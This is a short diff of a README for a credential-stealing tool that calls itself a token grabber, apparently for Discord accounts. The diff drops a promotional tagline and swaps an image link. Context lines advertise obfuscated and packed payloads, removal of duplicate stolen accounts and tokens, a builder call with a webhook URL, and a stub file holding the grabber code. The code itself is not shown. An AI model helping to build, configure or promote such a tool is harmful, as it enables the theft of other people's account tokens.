@@ -12,7 +12,7 @@
 <h1 align="center">FEATURE</h1>
 
 - Dynamic url
-- Private Database🦄 тнe мoѕт αdvαɴced αɴd powerғυl тoĸeɴ ɢrαввer
+- Private Database
 - Remove Duplicate account / token
 - Obfuscate and pack payload
 - Easy to use
@@ -49,7 +49,7 @@ EL1T3(dynamic_url= True, webhook_url= "https://pastebin.com/raw/bNcRrQiK", api_u
 - **You can edit the grabber code on ``stub.txt`` file**
 - **Dynamic api url in builder soon**
 
-<img align="center" src="https://media.discordapp.net/attachments/820460842637459460/823377508602085386/unknown.png">
+<img align="center" src="https://media.discordapp.net/attachments/823543490578219008/823601738585866251/unknown.png">
 <img align="center" src="https://media.discordapp.net/attachments/820460842637459460/823377574079234098/unknown.png">
 <img align="center" src="https://media.discordapp.net/attachments/820460842637459460/823378287535194212/unknown.png">
 
